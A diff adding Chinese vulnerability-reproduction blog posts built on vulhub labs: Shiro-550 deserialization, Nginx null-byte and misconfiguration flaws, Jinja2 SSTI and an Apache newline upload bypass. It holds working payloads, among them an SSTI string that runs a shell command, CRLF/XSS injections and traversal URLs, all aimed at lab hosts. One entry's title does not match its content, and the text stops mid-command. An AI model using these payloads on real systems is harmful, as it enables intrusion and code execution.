@@ -4,6 +4,181 @@
   
     
     <entry>
+      <title>Apache_Shiro_1.2.4反序列化漏洞</title>
+      <link href="/2023/01/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/01/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>ApacheShiro 1.2.4 反序列化漏洞即shiro-550反序列化漏洞。Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能，用户登录成功后会将用户信息加密，加密过程：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;BASE64编码&#x3D;&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务器收到请求对RememberMe值，先进行base64解码然后AES解密在反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认的密钥，所以我们更容易触发该漏洞。</p><p>所以我们Payload产生的过程:</p><p>恶意命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;BASE64编码&#x3D;&gt;RememberMe Cookie值</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Apache Shiro &lt;&#x3D;1.2.4</li></ul><h3 id="判断是否存在shiro特征"><a href="#判断是否存在shiro特征" class="headerlink" title="判断是否存在shiro特征"></a>判断是否存在shiro特征</h3><ol><li><p>未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907153232366.png" alt="image-20230907153232366"></p></li><li><p>登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907153330425.png" alt="image-20230907153330425"></p></li><li><p>不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907154254331.png" alt="image-20230907154254331"></p></li><li><p>勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907154454092.png" alt="image-20230907154454092"></p></li><li><p>或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907154630381-1697547221966.png" alt="image-20230907154630381"></p></li></ol><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面</span><br><span class="line">http://10.9.75.198:8080/login</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907154955606.png" alt="image-20230907154955606"></p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>jar工具下载地址：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破密钥</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908152410751.png" alt="image-20230908152410751"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检测可利用链</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908152440560.png" alt="image-20230908152440560"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">就可以执行命令</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908152610236.png" alt="image-20230908152610236"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Nginx文件名逻辑漏洞</title>
+      <link href="/2023/01/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/01/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>非法字符空格和截止符（\0）会导致Nginx解析URI时的有限状态机混乱，此漏洞可导致目录跨越及代码执行</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p><p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p><p>而存在CVE-2013-4547的情况下，我们请求<code>1.gif[0x20][0x00].php</code>，这个URI可以匹配上正则<code>\.php$</code>，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code>，就设置其为<code>SCRIPT_FILENAME</code>的值发送给fastcgi。</p><p>fastcgi根据<code>SCRIPT_FILENAME</code>的值进行解析，最后造成了解析漏洞。</p><p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p><p>再举个例子，比如很多网站限制了允许访问后台的IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /admin/ &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以请求如下URI：<code>/test[0x20]/../admin/index.php</code>，这个URI不会匹配上location后面的<code>/admin/</code>，也就绕过了其中的IP验证；但最后请求的是<code>/test[0x20]/../admin/index.php</code>文件，也就是<code>/admin/index.php</code>，成功访问到后台。（这个前提是需要有一个目录叫“test ”：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面：</span><br><span class="line">http://192.168.149.212:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907213859579.png" alt="image-20230907213859579"></p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传一个php文件,修改后缀名为</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907214833052.png" alt="image-20230907214833052"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包， 将文件重命名为1.gif 截断符.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221244297.png" alt="image-20230907221244297"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里先用aa进行占位，之后通过16进制进行修改,将这里的aa修改为空格（20）和截断符（00）</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221351890.png" alt="image-20230907221351890"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221419431.png" alt="image-20230907221419431"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重新发送包，能够正常上传</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221600722.png" alt="image-20230907221600722"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221628431.png" alt="image-20230907221628431"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取get包，同样的操作，进行修改</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221714686.png" alt="image-20230907221714686"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送包，获取结果</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907221031716.png" alt="image-20230907221031716"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Nginx配置错误</title>
+      <link href="/2023/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/"/>
+      <url>/2023/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">运行成功后，Nginx将会监听8080/8081/8082三个端口，分别对应三种漏洞。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907223743017.png" alt="image-20230907223743017"></p><h3 id="Mistake-1-CRLF注入漏洞"><a href="#Mistake-1-CRLF注入漏洞" class="headerlink" title="Mistake 1. CRLF注入漏洞"></a>Mistake 1. CRLF注入漏洞</h3><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>CRLF是”回车 + 换行”（\r\n）的简称，,其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中，可造成固定会话漏洞和反射型xss漏洞。</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nginx会将$uri进行解码，导致传入%0d%0a即可引入换行符，造成CRLF注入漏洞。</span><br><span class="line">错误的配置文件示例：</span><br><span class="line">location / &#123;</span><br><span class="line">    return 302 https://$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面，并抓包</span><br><span class="line">http://10.9.75.198:8080/%0d%0aSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908115350158.png" alt="image-20230908115350158"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再次注入：</span><br><span class="line">%0d%0a%0d%0a&lt;script&gt;alter(1)&lt;/script&gt;</span><br><span class="line">http://10.9.75.198:8080/%0d%0a%0d%0a&lt;script&gt;alter(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908115511697.png" alt="image-20230908115511697"></p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头</p><h3 id="Mistake-2-目录穿越漏洞"><a href="#Mistake-2-目录穿越漏洞" class="headerlink" title="Mistake 2. 目录穿越漏洞"></a>Mistake 2. 目录穿越漏洞</h3><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>目录穿越漏洞常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。假设静态文件存储在&#x2F;home&#x2F;目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名。</p><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。</span><br><span class="line"></span><br><span class="line">错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</span><br><span class="line"></span><br><span class="line">location /files &#123;</span><br><span class="line">    alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.9.75.198:8081/files../</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908115102367.png" alt="image-20230908115102367"></p><h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用/闭合/files,形成/files/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908114655752.png" alt="image-20230908114655752"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908114733797.png" alt="image-20230908114733797"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启nginx服务,再次访问http://10.9.75.198/files../,提示404,说明该漏洞不存在。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230908114949890.png" alt="image-20230908114949890"></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Nginx解析漏洞</title>
+      <link href="/2023/01/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/01/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</p><h3 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h3><ul><li>Nginx 1.x 最新版</li><li>PHP 7.x最新版</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问：http://192.168.149.212/uploadfiles/nginx.png</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907222635719.png" alt="image-20230907222635719"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问：http://192.168.149.212/uploadfiles/nginx.png/.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230907222703924.png" alt="image-20230907222703924"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Flask（Jinja2）服务端模板注入漏洞</title>
+      <link href="/2023/01/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Flask%EF%BC%88Jinja2%EF%BC%89%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/01/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Flask%EF%BC%88Jinja2%EF%BC%89%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>SSTI攻击可以利用拼接恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>使用Flask框架开发并且使用Jinja2模板引擎，最重要的是模板内容可控。满足该条件的Flask模块中几乎都存在注入漏洞。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask，request </span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():     </span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)       t = Template(<span class="string">&quot;Hello &quot;</span> + name)     </span><br><span class="line">    <span class="keyword">return</span> t.render() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>漏洞主要出在：“t &#x3D; Template(“Hell” + name)”，由于使用拼接后直接进行渲染，导致命令注入。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看端口号：sudo docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230921165006989.png" alt="image-20230921165006989"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面：192.168.149.212:8000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230921165120348.png" alt="image-20230921165120348"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POC1：</span><br><span class="line">http://192.168.149.212:8000/?name=&#123;&#123;233*233&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230921164218238.png" alt="image-20230921164218238"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POC2：</span><br><span class="line">http://192.168.149.212:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230921163439825.png" alt="image-20230921163439825"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/s1mpL3&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + &#123;&#123;defense&#125;&#125;)</span><br><span class="line">    <span class="keyword">return</span> t.render(defense=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Apache_Shiro124反序列化漏洞</title>
+      <link href="/2022/12/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro124%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2022/12/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Shiro124%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>此漏洞的出现是由于apache在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析php时xxx.php\x0A将被按照php后缀进行解析，导致绕过一些服务器的安全策略</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问页面：</span><br><span class="line">http://10.9.75.198:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906190143139.png" alt="image-20230906190143139"></p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在桌面创建1.php文件，写入一句话木马，将1.php上传，用bp进行抓包</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906191310203.png" alt="image-20230906191310203"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传失败</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906191349385.png" alt="image-20230906191349385"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看源代码，发现后端设置了黑名单拦截</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $name = basename($_POST[&#x27;name&#x27;]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;, &#x27;phtml&#x27;, &#x27;pht&#x27;])) &#123;</span><br><span class="line">        exit(&#x27;bad file&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &#x27;./&#x27; . $name);</span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;title&gt;Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">                &lt;label&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/label&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">                &lt;label&gt;filename:&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;evil.php&quot;&gt;&lt;/label&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看抓包，漏洞利用，修改在07和0d之间输入0a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906191836579.png" alt="image-20230906191836579"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906202539137.png" alt="image-20230906202539137"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再次发送包，将1.php修改为1.php%0a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906202754720.png" alt="image-20230906202754720"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞的成因就是apache中的配置文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看容器列表</span><br><span class="line">sudo docker ps -a</span><br><span class="line">在容器中执行命令</span><br><span class="line">sudo 